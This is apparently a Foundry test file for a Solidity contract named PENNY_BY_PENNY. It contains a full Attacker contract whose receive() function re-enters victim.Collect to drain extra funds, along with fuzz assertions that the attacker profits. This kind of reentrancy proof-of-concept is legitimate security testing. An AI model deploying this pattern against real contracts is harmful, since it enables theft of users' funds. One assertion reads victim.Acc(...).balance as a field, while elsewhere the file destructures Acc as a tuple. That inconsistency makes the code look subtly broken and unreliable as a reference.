
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PENNY_BY_PENNY, LogFile} from "../src/PENNY_BY_PENNY.sol";

contract TestReentrancyPENNY_BY_PENNY is Test {
    PENNY_BY_PENNY public victim;
    LogFile public log;
    Attacker public _attacker;

    function setUp() public {
        log = new LogFile();
        victim = new PENNY_BY_PENNY();

        victim.SetMinSum(1 wei);
        victim.SetLogFile(address(log));
        victim.Initialized();

        _attacker = new Attacker(address(victim));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0);
        vm.assume(attackVal < type(uint128).max / 4);

        uint256 victimInitial = attackVal * 4;
        vm.deal(address(victim), victimInitial);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);

        vm.warp(block.timestamp + 1000);

        _attacker.attack(attackVal);

        assertTrue(
            _attacker.exploitSucceeded(),
            "Reentrancy attack failed: exploitSucceeded flag was not set."
        );

        assertGt(
            address(_attacker).balance,
            attackVal,
            "Attacker did not profit from the exploit"
        );
        assertLt(
            victim.Acc(address(_attacker)).balance,
            address(victim).balance + attackVal,
            "Victim state inconsistent after reentrancy"
        );
    }

    receive() external payable {}
}

contract Attacker {
    PENNY_BY_PENNY public victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        victim = PENNY_BY_PENNY(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;

        victim.Put{value: val}(0);

        (, uint256 balBefore) = getHolderInfo();
        require(balBefore >= val, "setup: deposit failed");
    }

    function attack(uint256 val) public {
        require(val == storedAttackVal, "attack: mismatched val");

        initialSnapshot = address(this).balance;

        victim.Collect(val);

        if (address(this).balance > initialSnapshot + val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            victim.Collect(storedAttackVal);
        }
    }

    function getHolderInfo() internal view returns (uint256 unlockTime, uint256 balance) {
        (unlockTime, balance) = victim.Acc(address(this));
    }
}
